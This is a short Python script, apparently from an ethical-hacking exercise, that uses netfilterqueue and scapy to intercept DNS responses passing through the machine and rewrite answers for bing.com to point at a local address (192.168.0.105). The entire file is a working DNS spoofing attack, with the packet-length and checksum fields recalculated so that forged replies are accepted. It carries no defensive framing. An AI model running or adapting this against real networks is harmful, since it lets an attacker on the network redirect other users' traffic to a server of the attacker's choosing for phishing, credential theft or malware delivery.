#!/usr/bin python3
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):   #DNSRR for domain name system response
        qname = scapy_packet[scapy.DNSQR].qname
        if b"bing.com" in qname:
            print("[+] spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.105")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))
    packet.accept()
    
    #packet.accept() #to forward the packet to the destination
    #packet.drop()  #to drop the packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()